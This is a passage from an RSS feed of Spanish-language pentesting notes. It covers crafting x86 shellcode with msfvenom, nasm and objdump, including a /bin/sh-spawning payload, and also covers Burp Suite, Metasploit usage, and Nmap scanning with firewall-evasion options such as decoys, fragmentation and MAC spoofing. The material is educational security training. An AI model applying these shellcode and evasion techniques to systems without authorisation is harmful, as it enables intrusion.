# 00000000: 6a0b 5899 5266 682d 6389 e768 2f73 6800  j.X.Rfh-c..h/sh.
# 00000010: 682f 6269 6e89 e352 e812 0000 0065 6368  h/bin..R.....ech
# 00000020: 6f20 2748 6f6c 6120 6d75 6e64 6f27 0057  o 'Hola mundo'.W
# 00000030: 5389 e1cd 80                             S....
Copy<br>En este caso se ve que algunas cosas como el bin/sh están el little endian (Por la arquitectura de los 32 bits). Es como si hiciera /bin/sh -c "echo 'Hola mundo'". <br>En este caso mayormente solemos usar lenguajes de alto nivel para crear script, entre otras, como python, javascript, etc. Pero por ejemplo, python tiene el modulo sys el cual nos permite ejecutar código desde la consola y esto por detrás se encarga de realizar cosas.<br>El lenguaje ensamblador expresa las instrucciones de una forma más natural al hombre a la vez que muy cercana al microcontrolador, ya que cada una de esas instrucciones se corresponde con otra en código máquina. Este payload en lenguaje ensamblador se vería así: <br>msfvenom -p linux/x86/exec CMD="echo 'Hola Mundo'" -f raw | ndisasm -b32 -

# 00000000  6A0B              push byte +0xb
# 00000002  58                pop eax
# 00000003  99                cdq
# 00000004  52                push edx
# 00000005  66682D63          push word 0x632d
# 00000009  89E7              mov edi,esp
# 0000000B  682F736800        push dword 0x68732f
# 00000010  682F62696E        push dword 0x6e69622f
# 00000015  89E3              mov ebx,esp
# 00000017  52                push edx
# 00000018  E812000000        call 0x2f
# 0000001D  6563686F          arpl [gs:eax+0x6f],bp
# 00000021  2027              and [edi],ah
# 00000023  48                dec eax
# 00000024  6F                outsd
# 00000025  6C                insb
# 00000026  61                popa
# 00000027  204D75            and [ebp+0x75],cl
# 0000002A  6E                outsb
# 0000002B  646F              fs outsd
# 0000002D  27                daa
# 0000002E  005753            add [edi+0x53],dl
# 00000031  89E1              mov ecx,esp
# 00000033  CD80              int 0x80
Copy<br>Esto a bajo nivel, en la ultima línea el 'int 0x80' conlleva a una interrupción del sistema para posteriormente realizar ciertos llamados de funciones a los cuales se le pasará ciertos argumentos (En base a lo que la función espere) .<br>Para ver y entender mejor esto, debemos seguir analizando el binario para poder llegar a esta conclusión e incluso realizar esto mismo de manera manual. <br>msfvenom -p linux/x86/exec CMD="echo 'Hola mundo'" -f elf -o binary
# Una vez el binario con permisos de ejecución, podemos hacer uso de ST RACE (apt install strace) para ver a bajo nivel lo que hace el binario. 
strace ./binary 
# ............ more code ...................
# rt_sigaction(SIGTERM, NULL, {sa_handler=SIG_DFL, sa_mask=[], sa_flags=0}, 8) = 0
# rt_sigaction(SIGTERM, {sa_handler=SIG_DFL, sa_mask=~[RTMIN RT_1], sa_flags=SA_RESTORER, sa_restorer=0x7f9c6b3eaf90}, NULL, 8) = 0
# write(1, "Hola Mundo\n", 11Hola Mundo
# )            = 11
# exit_group(0)                           = ?
# +++ exited with 0 +++
Copy<br>Vemos que el binario a jo nivel esta haciendo write, 1, "Hola mundo" y 11, para entender mejor esto podemos ejecutar man 2 write para ver la estructura de la función :<br>man 2 write 
# write(2)                                                                           System Calls Manual                                                                          write(2)
#
# NAME
#      write - write to a file descriptor
#
# LIBRARY
#       Standard C library (libc, -lc)
#
# SYNOPSIS
#       #include &lt;unistd.h&gt;
#
#       ssize_t write(int fd, const void buf[.count], size_t count);
#
# DESCRIPTION 
# .............
Copy<br>Por lo que podemos ver que la función write recibe 3 argumentos, el primero int fd (Un número de salida del sistema), el segundo const void *buf (Dirección donde esta contenida la cadena a mostrar en consola) y el tercer y último argumento size_t count (Un número que hace alución al tamaño de la cadena).<br>Ahora, para realizar estas acciones, por ejemplo un write a bajo nivel, podemos usar la ruta /usr/include/asm/unistd_32.h o /usr/include/x86_64-linux-gnu/asm/unistd_32.h, las cuales son rutas que indican el valor numérico que hace referencia a funciones a nivel de sistema como write, read, etc.<br>Por lo que ahora, con esta ruta y entendiendo que es necesario ver como se componen las funciones a bajo nivel, que argumentos recibe, etc. podemos realizar nuestros shellcodes (BásicosPasted image 20230612140522) de manera manual: <br><br>section .text 
	gobal _start

_start:
Copy<br>En este caso .asm es la extención de archivos escritos en lenguaje ensamblador, y en el script se define una sección en donde declaramos una variable global para indicar por donde comenzara el flujo del sistema...<br>
Algo importante a tener en cuenta es que existen ciertos registros eax, abx, ecx, edx, etc. los cuales son "argumentos" que se van a leer, es decir que si quiero ejecutar una función la cual se encargue de realizar un "Hola mundo" a nivel de sistema, una vez realizada la interrupción del mismo (int 0x80) se leerá el registro eax para saber que operatoria se debe realizar, este registro es el que debería pasar el valor 4 sacado de la ruta /usr/include/x86_64-linux-gnu/asm/unistd_32.h ya que en esta nos indican que para realizar a nivel de sistema un write se utiliza el valor 4, a su vez esta función recibe 3 argumentos los cuales serán pasados con el registro ebx, ecx y edx, y así  sucesivamente. <br><img alt="hola_mundo_ensamblador.png" src="https://dobliuw.com/lib/media/hola_mundo_ensamblador.png"><br>Este código en lenguaje ensamblador tiene la intención de ser un binario que realiza un simple "echo "Hola mundo\n". Pero para que lo sea debemos compilarlo para que tenga formato .o y posteriormente convertirlo en un binario: <br>nasm -f elf code.asm 
# Esto genera el archivo code.o 
ld -m elf_i386 -o {nombre_del_binario_final} code.o 
# Esto genera el binario final con el nombre indicado 
Copy<br>Ahora para obtener el shellcode en base a un script generado por lenguaje ensamblador, podemos hacer uso de objdump: <br>objdump -d {nombre_del_binario_final} 
# final:     file format elf32-i386
# Disassembly of section .text:

# 08049000 &lt;_start&gt;:
# 8049000:	b8 04 00 00 00       	mov    $0x4,%eax
# 8049005:	bb 01 00 00 00       	mov    $0x1,%ebx
# 804900a:	68 64 6f 0a 00       	push   $0xa6f64
# 804900f:	68 20 6d 75 6e       	push   $0x6e756d20
# 8049014:	68 48 6f 6c 61       	push   $0x616c6f48
# 8049019:	89 e1                	mov    %esp,%ecx
# 804901b:	ba 0b 00 00 00       	mov    $0xb,%edx
# 8049020:	cd 80                	int    $0x80
# 8049022:	b8 01 00 00 00       	mov    $0x1,%eax
# 8049027:	31 db                	xor    %ebx,%ebx
# 8049029:	cd 80                	int    $0x80

printf '\\x' &amp;&amp; objdump -d {nombre_del_binario_final} | grep "^ " | cut -f2 | tr -d  ' ' | tr -d '\n' | sed 's/.\{2\}/&amp;\\x /g' | head -c-3 | tr -d ' '; echo
# \xb8\x04\x00\x00\x00\xbb\x01\x00\x00\x00\x68\x64\x6f\x0a\x00\x68\x20\x6d\x75\x6e\x68\x48\x6f\x6c\x61\x89\xe1\xba\x0b\x00\x00\x00\xcd\x80\xb8\x01\x00\x00\x00\x31\xdb\xcd\x80
# Este oneliner se queda con los valores necesarios, para agregar el \x al principio entre valores de 2 en 2. Es decir, nuestro shellcode (Con ciertos badchars)
Copy<br>Por ejemplo si quisiéramos crear un shellcode que se encargase de espawnear una bash: <br><br><img alt="respawn_bash_ensamblador.png" src="https://dobliuw.com/lib/media/respawn_bash_ensamblador.png"><br>nasm -t elf respawn_bash.asm 

ld -m elf_i386 -o respawn_bash respawn_bash.o 

printf '\\x' &amp;&amp; objdump -d respawn_bash | grep "^ " | cut -f2 | tr -d  ' ' | tr -d '\n' | sed 's/.\{2\}/&amp;\\x /g' | head -c-3 | tr -d ' '; echo
# \xb8\x0b\x00\x00\x00\x6a\x00\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\x31\xd2\xcd\x80
Copy]]></description><link>https://dobliuw.com/notes/4.-cybersecurity/redteam/pentesting/systems/4.-advanced/buffer-overflow/shellcodes.html</link><guid isPermaLink="false">Notes/4. Cybersecurity/RedTeam/Pentesting/Systems/4. Advanced/Buffer Overflow/Shellcodes.md</guid><dc:creator><![CDATA[Dobliuw]]></dc:creator><pubDate>Thu, 04 Apr 2024 17:35:12 GMT</pubDate><enclosure url="https://dobliuw.com/lib/media/hola_mundo_ensamblador.png" length="0" type="image/png"/><content:encoded>&lt;figure&gt;&lt;img src=&quot;https://dobliuw.com/lib/media/hola_mundo_ensamblador.png&quot;&gt;&lt;/figure&gt;</content:encoded></item><item><title><![CDATA[Burpsuite]]></title><description><![CDATA[<a class="tag" href="https://dobliuw.com/?query=tag:tools" style="background-color: rgb(4, 108, 116); color: white; font-weight: 700; border: none; border-radius: 1em; padding: 0.2em 0.5em;">#tools</a> <a class="tag" href="https://dobliuw.com/?query=tag:web" style="background-color: rgb(4, 108, 116); color: white; font-weight: 700; border: none; border-radius: 1em; padding: 0.2em 0.5em;">#web</a> <a class="tag" href="https://dobliuw.com/?query=tag:ataques" style="background-color: rgb(4, 108, 116); color: white; font-weight: 700; border: none; border-radius: 1em; padding: 0.2em 0.5em;">#ataques</a> <a class="tag" href="https://dobliuw.com/?query=tag:uso" style="background-color: rgb(4, 108, 116); color: white; font-weight: 700; border: none; border-radius: 1em; padding: 0.2em 0.5em;">#uso</a> 
 <br><br>
<br>Tags: <a href="https://dobliuw.com?query=tag:tools" class="tag" target="_blank" rel="noopener nofollow">#tools</a> <a href="https://dobliuw.com?query=tag:web" class="tag" target="_blank" rel="noopener nofollow">#web</a> <a href="https://dobliuw.com?query=tag:ataques" class="tag" target="_blank" rel="noopener nofollow">#ataques</a>  <a href="https://dobliuw.com?query=tag:uso" class="tag" target="_blank" rel="noopener nofollow">#uso</a>
<br><br><br>Burpsuite es una herramienta de prueba de penetración utilizada para encontrar vulnerabilidades de seguridad en aplicaciones web. es una de las herramientas de prueba de penetración más populares y utilizadas en la industria de la seguridad informática. Burpsuite se compone de varias herramientas diferentes qeu se pueden utilizar juntas para indentificar vulnerabilidades en una aplicación web.<br><br><br>A la hora de usar burpsuite, se puede usar desde su propio navegador, o lo que es más recomendable es usar la extencion de <a data-tooltip-position="top" aria-label="https://addons.mozilla.org/es/firefox/addon/foxyproxy-standard/" rel="noopener nofollow" class="external-link" href="https://addons.mozilla.org/es/firefox/addon/foxyproxy-standard/" target="_blank">FoxyProxy</a> la cual podemos configurar para que rediriga todo el trafico http a un puerto de nuestra maquina en el cual estaria escuchando Burpsuite, de esta manera se vuelve más comodo trabajar con la herramienta.<br>
<br>


<br>Burpsuite de manera automatica captura las peticiones pero no las respuestas, para capturar las respuestas podemos hacerlo para: <br>
<br>


<br>


<br><img alt="InterceptarRespuestasSiempreBurp.png" src="https://dobliuw.com/lib/media/interceptarrespuestassiempreburp.png" style="width: 1200px; max-width: 100%;"><br>Aveces queremos que los peticiones no se tramiten hasta llegar al servido, normalmente cuando queremos que la peticion flusha precionamos Forward, mientras qeu cuando queremos desecharlas Drop.  <br>Algo que tambien podriamos hacer es crear reglas para remplazar valores, por ejemplo en headers, o body, de peticion o respuesta, pedir que el valor de "200 OK" de remplaze por "201 Ejemplo"<br><img alt="ReglasParaRemplazarValoresBurp.png" src="https://dobliuw.com/lib/media/reglaspararemplazarvaloresburp.png" style="width: 1200px; max-width: 100%;"><br>
<br>


<br>Algo que es muy importante a la hora de trabajar con Burpsuite es configurar el scope de trbajo, es decir, configurar el o los dominios que deseamos que la herramienta capture su trafico para que asi, por ejemplo en el apartado de Site Map, veamos todo el flujo para con el o los dominios ingresados. <br><img alt="ScopeConfigBurp.png" src="https://dobliuw.com/lib/media/scopeconfigburp.png" style="width: 1200px; max-width: 100%;"><br>Una vez agregado el scope, deberiamos en la seccion de proxy indicar que solo queremos que se envien items al historial del proxy si esta dentro del scope.<br><img alt="ProxyHistoriaJustScope.png" src="https://dobliuw.com/lib/media/proxyhistoriajustscope.png" style="width: 1200px; max-width: 100%;"><br><br><br>
<br>

Es la herramienta principal de Burpsuite y actúa como un intermediario entre el navegador web y el servidor web. Esto permite a los usuarios interceptar y modificar las solicitudes y respuestas HTTP y HTTPS enviadas entre el navegador y el servido. El proxy también es útil para la identificación de vulnerabilidades, ya que permite a los usuarios examinar el tráfico y analizar las solicitudes y respuestas. 
<br><br>
<br>

Es una herramienta de prueba de vulnerabilidades automatizada que se utiliza para identificar vulnerabilidades en aplicaciones web. El Scanner utiliza técnicas de exploración avanzadas para detectar vulnerabilidades de la aplicación web, como injecciones SQL, cross-site scripting (XSS), vulnerabilidadesd de seguridad de la capa de aplicación y más.
<br><br>
<br>

Es una herramienta que permite a los usuarios reenviar y repetir solicitudes HTTP y HTTPS. Esto es útil para probar diferentes entradas y verificar la respuesta del servidor. También es útil para  la identificación de vulnerabilidades, ya que permite a los usuarios probar diferentes valores y detectar respuestas inesperadas.
<br><br>
<br>

Es una herramienta que permite a los usuarios analizar la aleatoriedad y predictibilidad de los tokens de sesión o caulquier otro valor generado por una apliación web. Esto es útil para evaluar la calidad de la generación de tokens de sesión y para identificar posibiles vulnerabilidades relacionadas con la previsiibilidad de estos tokens. Se puede hacer uso de esto en peticiones en tiempo real que genera y tramita Burpsuite a la web o de muestras de tokens o valores generados que querramos cargar (Manual load).
<br><br>
<br>

Es una herramienta que se utiliza para automatizar ataques de fuerza bruta. Los usuarios pueden definir diferentes payloads para diferentes partes de la solilcitud, como la URL, el cuerpo de la solicitud y las cabeceras. Posteriormente, Intruder automatiza la ejecución de solicitudes utilizando diferentes payloads y los usuarios pueden examinar las respuestas para identificar vulnerabilidades.<br>
Los payloads en esta sección se pueden agregar seleccionando el campo el cual nos interesa volver payload y agregando la función de Add §
<br>Los tipos de ataques de fuerza bruta con los que cuenta Burpsuite son los siguientes: <br>
<br>


<br><br>Ejemplo:<br><br><br><br><br>
<br>


<br><br>Ejemplo:<br><br><br><br><br>
<br>


<br><br>Ejemplo:<br><br><br><br><br><br><br><br>
<br>


<br><br>Ejemplo:<br><br><br><br><br><br><br><br><br><br>
<br>

Es una herramienta que se utiliza para comparar dos solicitudes HTTP o HTTPS. Esto es útil para detectar diferencias entre las solilcitudes y respuestas y analizar la seguridad de la aplicación. 
<br><br><br>Tambien es importante mencionar que esta herramienta acepta instalación de plugins los cuales se pueden buscar e instalar de manera facil desde la propia interfaz de Burpsuite: <br><img alt="ExtensionsBurp.png" src="https://dobliuw.com/lib/media/extensionsburp.png" style="width: 1200px; max-width: 100%;"><br><br><br>Algo para lo que tambien puede ser muy util Burpsuite, es para interceptar el envio de peticiones que realizan herramientas automaticas como <a data-href="SQLMap" href="https://dobliuw.com/notes/4.-cybersecurity/redteam/pentesting/systems/tools/sqlmap.html" class="internal-link" target="_self" rel="noopener nofollow">SQLMap</a>, wfuzz, gobuster, las cuales son herramientas que pueden servir tanto para la <a data-href="Fase de Reconocimiento" href="https://dobliuw.com/notes/4.-cybersecurity/redteam/pentesting/systems/2.-audit-phases/1.-reconnaissance/fase-de-reconocimiento.html" class="internal-link" target="_self" rel="noopener nofollow">Fase de Reconocimiento</a> como de ataque.<br>
De esta manera asi como estas herramientas contemplan en su codigo un parametro para ingresar un proxy, puede haber muchas otras herramientas las cuales tambien lo acepten y de esa manera utilizar Burpsuite para analizar aquellas peticiones HTTP o HTTPS que se tramitan de manera automatizada para el escaneo o explotación]]></description><link>https://dobliuw.com/notes/4.-cybersecurity/redteam/pentesting/systems/tools/burpsuite.html</link><guid isPermaLink="false">Notes/4. Cybersecurity/RedTeam/Pentesting/Systems/Tools/Burpsuite.md</guid><dc:creator><![CDATA[Dobliuw]]></dc:creator><pubDate>Thu, 04 Apr 2024 17:35:14 GMT</pubDate><enclosure url="https://dobliuw.com/lib/media/interceptarrespuestassiempreburp.png" length="0" type="image/png"/><content:encoded>&lt;figure&gt;&lt;img src=&quot;https://dobliuw.com/lib/media/interceptarrespuestassiempreburp.png&quot;&gt;&lt;/figure&gt;</content:encoded></item><item><title><![CDATA[Debugging con pdb en Python]]></title><description><![CDATA[<a class="tag" href="https://dobliuw.com/?query=tag:python" style="background-color: rgb(4, 108, 116); color: white; font-weight: 700; border: none; border-radius: 1em; padding: 0.2em 0.5em;">#python</a> <a class="tag" href="https://dobliuw.com/?query=tag:practica" style="background-color: rgb(4, 108, 116); color: white; font-weight: 700; border: none; border-radius: 1em; padding: 0.2em 0.5em;">#practica</a> <a class="tag" href="https://dobliuw.com/?query=tag:debugging" style="background-color: rgb(4, 108, 116); color: white; font-weight: 700; border: none; border-radius: 1em; padding: 0.2em 0.5em;">#debugging</a> <a class="tag" href="https://dobliuw.com/?query=tag:libreria" style="background-color: rgb(4, 108, 116); color: white; font-weight: 700; border: none; border-radius: 1em; padding: 0.2em 0.5em;">#libreria</a> 
 <br><br>
<br>Tags: <a href="https://dobliuw.com?query=tag:python" class="tag" target="_blank" rel="noopener nofollow">#python</a> <a href="https://dobliuw.com?query=tag:practica" class="tag" target="_blank" rel="noopener nofollow">#practica</a> <a href="https://dobliuw.com?query=tag:debugging" class="tag" target="_blank" rel="noopener nofollow">#debugging</a> <a href="https://dobliuw.com?query=tag:libreria" class="tag" target="_blank" rel="noopener nofollow">#libreria</a>
<br><br><br>Pdb es una libreria de python que nos permite hacer debugging para poder ir viendo como se comporta el programa en ciertos momentos del script.<br># Esto sirve para poner un "breakpoint"
pdb.set_trace()

# A la hora de ejecutar el script, con
l # ver
p {var} # Mostrar el valor de la variable
Copy]]></description><link>https://dobliuw.com/notes/4.-cybersecurity/redteam/pentesting/systems/tools/debugging-con-pdb-en-python.html</link><guid isPermaLink="false">Notes/4. Cybersecurity/RedTeam/Pentesting/Systems/Tools/Debugging con pdb en Python.md</guid><dc:creator><![CDATA[Dobliuw]]></dc:creator><pubDate>Thu, 04 Apr 2024 17:35:14 GMT</pubDate></item><item><title><![CDATA[Metasploit]]></title><description><![CDATA[<a class="tag" href="https://dobliuw.com/?query=tag:tools" style="background-color: rgb(4, 108, 116); color: white; font-weight: 700; border: none; border-radius: 1em; padding: 0.2em 0.5em;">#tools</a> <a class="tag" href="https://dobliuw.com/?query=tag:automatic" style="background-color: rgb(4, 108, 116); color: white; font-weight: 700; border: none; border-radius: 1em; padding: 0.2em 0.5em;">#automatic</a> 
 <br><br>
<br>Tags: <a href="https://dobliuw.com?query=tag:tools" class="tag" target="_blank" rel="noopener nofollow">#tools</a> <a href="https://dobliuw.com?query=tag:automatic" class="tag" target="_blank" rel="noopener nofollow">#automatic</a> 
<br><br><br>Metasploit es una plataforma de pruebas de penetración (Penetration Testing Framework) que se utiliza para realizar pruebas de seguridad en sistemas y aplicaciones. Esta plataforma es amplia mente utilizada por investigadores de seguridad, pentesters y profesionales de la seguridad para descubrir vulnerabilidades y realizar pruebas de explotación de vulnerabilidades. Metasploit se basa en un conjunto de herramientas de seguridad que incluyen un framework de desarrollo de exploits, un motor de base de datos de vulnerabilidades y una colección de módulos de explotación de vulnerabilidades. <br>Esta herramienta se utiliza para probar la seguridad de un sistema o aplicación mediante la realización de pruebas de penetración, con el objetivo de identificar y explotar vulnerabilidades de seguridad. Para hacer esto, Metasploit proporciona una gran cantidad de exploits, payloads y módulos de post-explotación, que pueden ser utilizados por los profesionales de seguridad para identificar vulnerabilidades y explotarlas. Al utilizar metasploit, los profesionales de la seguridad pueden simular ataques reales y descubrir vulnerabilidades en sistemas y aplicaciones antes de que los atacantes malintencionados puedan hacerlo, lo que les permite corregir las vulnerabilidades y mejorar la seguridad de sus sistemas. <br><br>Los módulos de metasploit son muchos, como exploits, nops, encoders, evasión, etc. Estos mayormente se pueden ver en /usr/share/metasploit-framework/modules donde podríamos ver cada uno de los scripts que se contienen y demás. <br>Cada script suele tener una función initialize la cual contiene las plataformas, referencias, autor, etc. Lo que viene muy bien para utilizar la función search de metasploit que te permite filtrar y realizar búsquedas. <br>
<br>


<br>msfdb run 
Copy<br>
<br>


<br># Listar como utilizar la funcionalidad de search
search
# Buscar cosas de un sistema operativo: 
search platform:"linux"
# Buscar tipos de payload/encoders/etc: 
search platform:"windows" type:"encoder"
Copy<br>
<br>


<br># En Metasploit esxisten "workspaces" que sirven para trabajar de una manera más ordenada

# Listar espacios de trabajo 
workspace
# Crear nuevo espacio de trabajo 
workspace -a {name}
# Migrar a diferente espacio de trabajo 
workspace {name}
Copy<br>
<br>


<br># Usar el script:
use {script}
# Listar opciones: 
show options
# Listar opciones avanzadas: 
show advanced options
# Obtener información del script: 
info 
# Modificar valores del script
set VERBOSE true
# Correr el script 
run 
Copy<br>
<br>


<br># Podemos escanear con un script de MSF la red, una vez que tengamos los hosts descubiertos...
use scanner/discovery/arp_sweep 
set RHOST {ip}/{cidr}
run  
# Podremos ver los hosts descubiertos
hosts
# Y los servicios detectados para dichos hosts
services
# Así como importar en formato XML el resultado del escaneo de nmap 
nmap -sS --min-rate 5000 -p- --open -vvv -n -Pn {ip} -oX allPorts
db_import /path/allPorts 
# Al listar los servicios ahora veríamos los importados y descubiertos por nmap
# Para listar info de los puertos así como el OS podríamos hacer lo mismo:
nmap -A {ip} -oX OSSccan
db_import /path/OSScan
# Seleccionar campos especificos
hosts -C {field}
# Usar nmap integrado 
db_nmap {ip}
Copy]]></description><link>https://dobliuw.com/notes/4.-cybersecurity/redteam/pentesting/systems/tools/metasploit.html</link><guid isPermaLink="false">Notes/4. Cybersecurity/RedTeam/Pentesting/Systems/Tools/Metasploit.md</guid><dc:creator><![CDATA[Dobliuw]]></dc:creator><pubDate>Thu, 04 Apr 2024 17:35:14 GMT</pubDate></item><item><title><![CDATA[Nmap]]></title><description><![CDATA[<a class="tag" href="https://dobliuw.com/?query=tag:tools" style="background-color: rgb(4, 108, 116); color: white; font-weight: 700; border: none; border-radius: 1em; padding: 0.2em 0.5em;">#tools</a> <a class="tag" href="https://dobliuw.com/?query=tag:ataques" style="background-color: rgb(4, 108, 116); color: white; font-weight: 700; border: none; border-radius: 1em; padding: 0.2em 0.5em;">#ataques</a> <a class="tag" href="https://dobliuw.com/?query=tag:reconocimiento" style="background-color: rgb(4, 108, 116); color: white; font-weight: 700; border: none; border-radius: 1em; padding: 0.2em 0.5em;">#reconocimiento</a> <a class="tag" href="https://dobliuw.com/?query=tag:basico" style="background-color: rgb(4, 108, 116); color: white; font-weight: 700; border: none; border-radius: 1em; padding: 0.2em 0.5em;">#basico</a> <a class="tag" href="https://dobliuw.com/?query=tag:web" style="background-color: rgb(4, 108, 116); color: white; font-weight: 700; border: none; border-radius: 1em; padding: 0.2em 0.5em;">#web</a> 
 <br><br>
<br>Tags: <a href="https://dobliuw.com?query=tag:tools" class="tag" target="_blank" rel="noopener nofollow">#tools</a> <a href="https://dobliuw.com?query=tag:ataques" class="tag" target="_blank" rel="noopener nofollow">#ataques</a> <a href="https://dobliuw.com?query=tag:reconocimiento" class="tag" target="_blank" rel="noopener nofollow">#reconocimiento</a> <a href="https://dobliuw.com?query=tag:basico" class="tag" target="_blank" rel="noopener nofollow">#basico</a> <a href="https://dobliuw.com?query=tag:web" class="tag" target="_blank" rel="noopener nofollow">#web</a> 
<br><br><br>Con el comando route -n podemos ver la dirección ip de nuestro router, en el apartado de Gateway.<br># Abrir manual de nmap.
man nmap 

# Escanear todos los rangos de puertos
nmap -p1-65535 {to_scan_ip}
namp -p- {to_scan_ip}

# Escanear los 500 puertos más comunes
nmap --top-ports 500 {to_scan_ip}

# Filtrar solo por aquellos puertos que esten abiertos, ignorando puerots filtrados. 
nmap -p- --open {to_scan_ip}

# Verbose para listar a medida que se vayan detectando puertos abiertos, los vaya reportando en tiempo de ejecución. 
nmap -p- --open -v {to_scan_ip}

# Quitar resolución DNS
nmap -p- --open -v -n {to_scan_ip}

# Seleccionar la plantilla de temporizado para agilizar el escaneo
nmap -p- -T5 --open -v -n {to_scan_ip}

# Tirar de TCP Connect Scan para intentar establecer conexión con el Three-Way Handshake, es decir tramitar un paquete SYN, para recibir o un paquete (RST -&gt; closed) o un paquete (SYN/ACK -&gt; open) para posteriormente establecer la conexión con un paquete ACK (established)
nmap -p- -T5 --open -sT -v -n {to_scan_ip} 

# Quitar el "HOST DISCOVERY" 
nmap -p- -T5 --open -sT -v -n -Pn {to_scan_ip}

# Para escanear los rangos de UDP
namp -p- --open -sU -v -n -Pn {to_scan_ip}

# Asi como con arp-scan -I eth0 --localnet, podemos ver los hosts que tenemos activos en nuestra red. Con nmap tambien 
nmap -sn {our_ip}/{cidr} 

# Tratar de detectar el sistema operativo
nmap -O {to_scan_ip}

# Tratar de detectar versión y servicios que corre para ciertos puertos
nmap -p22,80 -sCV {to_scan_ip}

# Evasión de Firewalls 
nmap -p22 -f {to_scan_ip}
nmap -p22 --mtu {num_multiplo_8} {to_scan_ip}
nmap -p22 -D 11.11.11.11 {to_scan_ip}
nmap -p22 --source-port 443 {to_scan_ip}
nmap -p22 --data-length 21 {to_scan_ip}
nmap -p22 --spoof-mac 00:11:22:33:44:55 {to_scan_ip}
nmap -p22 -sS {to_scan_ip}

# Exportar evidencia 
nmap -p22 -sCV {to_scan_ip} -oN {file_nmap_format} -oG {file_grep_format} -oX {file_xml_format}
# Puede ser util realizar esto ya que con herramientas como xsltproc podemos convertir el XML a HTML
# Para que se vea más lindo: https://github.com/honze-net/nmap-bootstrap-xsl
Copy<br><br>Nmap trae consigo muchos scripts codeados en lua que se pueden usar: <br># Localizar los scripts de nmap
locate .nse

# Indicar un script en concreto: 
nmap --script 

# Ver categorias existentes en nmap 
locate .nse | xargs grep categories | grep -oP '".*?"' | sort -u

# Fusionar categorias para no romper algo de producción puede ser muy importante por lo que podemos hacer uso de fusión de categorias, por ejemplo, si quisieramos lanzar scripts de categoria vuln para evitar conflictos podriamos requerir que tenga ademas la categoria safe
nmap --script="vuln and safe" -sV
nmap --script="vuln or safe" 
Copy<br>Y como siempre, tanto con wireshark como con tshark podriamos ponernos a ver que es lo que se tramita<br>
<br>
sudo tcpdump -i lo -w Captura.cap --localnet

<br>
tshark -r Captura.cap 2&gt;/dev/null

<br>Ahora podriamos con el parametro -Y de tshark, comenzar a jugar con filtros: <br>tshark -r Captura.cap -Tjson 2&gt;/dev/null -&gt; Para ver la respuesta en formato JSON<br>
tshark -r Captura.cap -Tfields -e tcp.payload 2&gt;/dev/null -&gt; Para ver el campo "tcp.payload"]]></description><link>https://dobliuw.com/notes/4.-cybersecurity/redteam/pentesting/systems/tools/nmap.html</link><guid isPermaLink="false">Notes/4. Cybersecurity/RedTeam/Pentesting/Systems/Tools/Nmap.md</guid><dc:creator><![CDATA[Dobliuw]]></dc:creator><pubDate>Tue, 27 Feb 2024 19:16:50 GMT</pubDate></item><item><title><![CDATA[¿ Que es <strong>Postman</strong> ?]]></title><description><![CDATA[ 
 <br><br>Postman es una plataforma API para que los desarrolladores diseñen, construyan, prueben e iteren sus API. <br><br><br>El uso de postman es bastante sensillo, podemos pegar una url, elegir el tipo de petición y listo. Ahora bien, el uso organizado y provechoso de postman es un poco más avanzado, podemos hacer uso de Colecciones, variables, entre otras cosas. <br>En ciberseguridad, postman es utilizado en algunos momentos en donde los atacantes organizan mejor los endpoints de la o las API/s que puedan haber en el sitio web que se esta auditorando, con el fin de enumerar información o conseguir el <a data-href="APIs abuse" href="https://dobliuw.com/notes/4.-cybersecurity/redteam/pentesting/systems/2.-audit-phases/2.-explotation/vulnerabilities/api-abuse/explotation/apis-abuse.html" class="internal-link" target="_self" rel="noopener nofollow">APIs abuse</a>.<br><br>Una colección podria  ser como una "carpeta" en la cual podemos guardar multiples endpoints y carpetas dentro de la misma, esto nos permite organizar la aplicación que estamos auditorando de una manera más ordenada y eficiente. <br><img alt="create_collection_postman.png" src="https://dobliuw.com/lib/media/create_collection_postman.png"><br>Una vez que tengamos una colección con un nombre representativo, podemos empezar a agregar endpoints los cuales iran apareciendo dentro de nuestra colección y a su vez podremos continuar agregando cuantos endpoints querramos. <br><img alt="add_enpoint_postman.png" src="https://dobliuw.com/lib/media/add_enpoint_postman.png"><br><br>Una vez que tengamos una colección podría ocurrir el caso de que los endpoints requieran headers especiales, como authorization, entre otros, obviamente, en el apartado de headers podemos agregarlo de manera manual, pero esto sería bastante tediosos y laborioso, es en casos como estos, en los que podemos hacer uso de las variables, estas se configuran para la colección y se hacen alución llamandolas con {{}}. <br><img alt="add_variables_postman.png" src="https://dobliuw.com/lib/media/add_variables_postman.png"><br>En este caso, tratandose de authorization, una vez creada la variable, podriamos ir al apartado de Authorization para configurar dicho header. De manera que, simplemente podriamos configurar el tipo de token junto al mismo haciendo alución a la variable: <br><img alt="authorization_token_postman.png" src="https://dobliuw.com/lib/media/authorization_token_postman.png"><br><br>Una funcionalidad cuanto menos interesante de cara a Postman, es la posibilidad de agregar un proxy para interceptar peticiones de nuestra preferencia, pudiendo hacer uso de expresiones regulares y metodos.<br><img alt="postman_proxy.png" src="https://dobliuw.com/lib/media/postman_proxy.png"><br>
De esta manera si configuramos el proxy con un determinado puerto y expresiones regulares en el campo URLs must contain, por ejemplo indicando unicamente que las peticiones tienen que tener la palabra api, estas se filtraran y capturaran.<br><img alt="postman_proxy_capture.png" src="https://dobliuw.com/lib/media/postman_proxy_capture.png"><br>
Una vez capturada la data de interez, podemos detener la captura de peticiones del proxy y agregar los que sean de nuestro interez a una colección.]]></description><link>https://dobliuw.com/notes/4.-cybersecurity/redteam/pentesting/systems/tools/postman.html</link><guid isPermaLink="false">Notes/4. Cybersecurity/RedTeam/Pentesting/Systems/Tools/Postman.md</guid><dc:creator><![CDATA[Dobliuw]]></dc:creator><pubDate>Mon, 26 Aug 2024 15:33:19 GMT</pubDate><enclosure url="https://dobliuw.com/lib/media/create_collection_postman.png" length="0" type="image/png"/><content:encoded>&lt;figure&gt;&lt;img src=&quot;https://dobliuw.com/lib/media/create_collection_postman.png&quot;&gt;&lt;/figure&gt;</content:encoded></item><item><title><![CDATA[SQLMap]]></title><description><![CDATA[<a class="tag" href="https://dobliuw.com/?query=tag:tools" style="background-color: rgb(4, 108, 116); color: white; font-weight: 700; border: none; border-radius: 1em; padding: 0.2em 0.5em;">#tools</a> <a class="tag" href="https://dobliuw.com/?query=tag:automatic" style="background-color: rgb(4, 108, 116); color: white; font-weight: 700; border: none; border-radius: 1em; padding: 0.2em 0.5em;">#automatic</a> 
 <br><br>
